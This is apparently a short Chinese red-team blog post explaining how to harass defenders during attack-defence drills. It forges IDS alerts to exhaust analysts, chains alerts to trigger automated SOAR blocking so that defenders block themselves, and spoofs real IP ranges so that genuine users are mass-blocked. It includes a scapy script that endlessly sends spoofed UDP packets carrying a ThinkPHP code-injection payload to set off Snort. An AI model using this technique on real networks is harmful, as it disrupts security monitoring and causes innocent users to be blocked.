---
title: scapy attack snort
date: 2021-11-01
categories: ["攻"]
tags: []
---

hw的时候防守方都是几百号人对几支攻击队，加上内网一大堆告警设备有些烦

一个恶心流量设备的小方法，可以通过伪造告警，耗尽防守方体力

还可以通过组合告警流量，来触发nids的soar，实现让他们自己封禁自己，也可以引入纯真ip池，让他们大规模封禁真实用户

demo

```
#!/usr/bin/env python

from scapy.all import *

packet_ip = IP(src="192.168.1.222", dst="192.168.1.143")

udp_3 = UDP(sport=4444, dport=16464)
payload_3 = "index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=18"

packet_3 = packet_ip / udp_3 / payload_3

packets = [packet_3]

send(packets, loop=1)

```